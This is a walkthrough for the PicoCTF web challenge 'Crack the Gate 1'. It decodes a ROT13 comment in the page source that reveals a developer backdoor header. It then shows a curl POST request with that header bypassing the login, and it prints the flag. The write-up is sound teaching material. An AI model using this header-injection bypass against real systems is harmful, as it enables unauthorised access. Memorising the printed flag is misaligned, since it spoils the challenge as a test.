# **Crack the Gate 1 – Walkthrough (PicoCTF)**

## **[Challenge](https://play.picoctf.org/practice/challenge/520) Overview**

**Category:** Web
**Goal:** Bypass a login mechanism by exploiting a hidden developer backdoor.

---

## **Step 1 — Initial Analysis**

Visiting the challenge URL displays a simple login page:

* Email and password fields
* A JavaScript `fetch()` request:

```js
POST /login
Content-Type: application/json

{
  "email": "...",
  "password": "..."
}
```

Inspecting the HTML source reveals a suspicious encoded comment:

```html
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
```

This is clearly not normal HTML.

---

## **Step 2 — Decoding the Comment (ROT13)**

The text is encoded with **ROT13**, a classic CTF pattern.

Decoding it:

| Encoded                        | Decoded                        |
| ------------------------------ | ------------------------------ |
| ABGR                           | NOTE                           |
| Wnpx                           | Jack                           |
| grzcbenel olcnff               | temporary bypass               |
| hfr urnqre "K-Qri-Npprff: lrf" | use header "X-Dev-Access: yes" |

This gives us a clear hint:

> **Use the HTTP header `X-Dev-Access: yes` to bypass login.**

---

## **Step 3 — Testing the Backdoor**

Testing the header on the main route:

```bash
curl -H "X-Dev-Access: yes" http://amiable-citadel.picoctf.net:49792/
```

This only returns the HTML page — meaning the bypass must target **the `/login` endpoint**, not `/`.

---

## **Step 4 — Exploiting `/login`**

Since the frontend sends a JSON POST request, we replicate it but include the developer backdoor header:

```bash
curl -X POST "http://amiable-citadel.picoctf.net:49792/login" \
  -H "Content-Type: application/json" \
  -H "X-Dev-Access: yes" \
  -d '{"email":"ctf-player@picoctf.org","password":"test"}'
```

The password does not matter — the backdoor bypasses authentication entirely.

---

## **Step 5 — Obtaining the Flag**

The server responds with:

```json
{
  "success": true,
  "flag": "picoCTF{brut4_f0rc4_1a386e6f}"
}
```

**Flag: `picoCTF{brut4_f0rc4_1a386e6f}`**

---

## **Conclusion**

This challenge demonstrates:

* The importance of reviewing source code and comments
* How hidden developer backdoors can be exploited
* How custom HTTP headers may unlock unintended functionality

**Final Flag:**

```
picoCTF{brut4_f0rc4_1a386e6f}
```

